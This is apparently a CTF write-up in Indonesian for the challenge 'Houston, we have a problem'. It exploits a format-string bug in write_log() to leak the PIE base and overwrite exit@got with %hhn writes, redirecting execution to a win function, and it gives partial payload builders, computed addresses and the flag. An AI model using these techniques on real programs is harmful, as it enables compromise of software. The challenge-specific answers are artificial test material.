# Houston, we have a problem

Binary ini 32-bit PIE dengan NX, canary, dan partial RELRO. Surface yang kepakai bukan overflow stack, tapi format string di `write_log()`:

```c
fprintf(fptr, log);
```

Input user ditulis sebagai format string ke `telemetry_log.fit`. File itu kemudian diparse lagi oleh `print_logs()`. Karena offset write dimulai tepat di card `END` (offset `720`), kita bisa bikin header FITS baru yang tetap valid dan dipakai buat leak stack.

## Ringkas bug-nya

- `fprintf(fptr, log)` memberi primitive format string.
- `%2$08x` leak alamat dari stack yang ternyata selalu berisi `write_log+0xf` (`0x3c4e` relatif ke base PIE).
- Setelah base PIE diketahui, `exit@got` bisa dihitung.
- Partial RELRO berarti GOT masih writable.
- Overwrite `exit@got` ke `emergency_orbit_realignment`.
- Trigger `write_log()` sekali lagi dengan input ber-spasi supaya return value jadi `1`.
- Pilih `Exit safely`; program sebenarnya memanggil `emergency_orbit_realignment(1)` dan flag keluar karena `1 < 160`.

## Kenapa hint `END` penting

`write_log()` selalu `fseek(..., 720, SEEK_SET)`. Offset `720` itu pas di awal card `END` milik file FITS. Kalau `END` hancur total, `print_logs()` gagal parse header dan program berhenti. Solusinya: bikin card pertama sepanjang 80 byte, lalu taruh `END` persis di card berikutnya.

Payload leak yang dipakai:

```python
first_card = b"COMMENT" + b"%2$08x" + b"A" * 65
payload = first_card + b"END"
```

`COMMENT` valid sebagai FITS header card, `%2$08x` expand jadi 8 hex digit, lalu `END` tetap jatuh di boundary 80-byte.

## Leak PIE

Hasil `Print logs` menampilkan line seperti ini:

```text
COMMENT56558c4eAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Nilai leak `0x56558c4e` berasal dari `write_log+0xf`, jadi:

```text
pie_base = 0x56558c4e - 0x3c4e = 0x56555000
```

Lalu:

```text
exit@got  = pie_base + 0x1781f4 = 0x566cd1f4
win       = pie_base + 0x3d91   = 0x56558d91
```

## Overwrite GOT

Karena buffer user nongol di stack argumen `fprintf`, alamat target bisa ditaruh di awal input lalu ditulis pakai `%hhn`.

Susunan pentingnya:

- Tambah 1 byte filler supaya alamat pertama pas di posisi argumen ke-6.
- Tulis `exit@got`, `exit@got+1`, `exit@got+2`, `exit@got+3`.
- Urutkan write berdasarkan byte tujuan supaya padding `%c` tetap kecil.

Potongan builder:

```python
payload = b"A" + p32(addr0) + p32(addr1) + p32(addr2) + p32(addr3)
payload += b"%1$...c%6$hhn..."
```

Setelah GOT `exit` diganti ke `emergency_orbit_realignment`, kirim lagi:

```text
Write log
TRIGGER SPACE
```

Input itu mengandung spasi, jadi `write_log()` langsung return `1`. Terakhir pilih:

```text
Exit safely
```

Call `exit(1)` sekarang mendarat ke fungsi win dan flag keluar.

## Solver

Jalankan:

```bash
source /home/nata/ctf_env/bin/activate
python3 solve.py REMOTE
```

## Flag

```text
boroCTF{wH@t_G0e3_uP_M8st_c0me_dOw4}
```
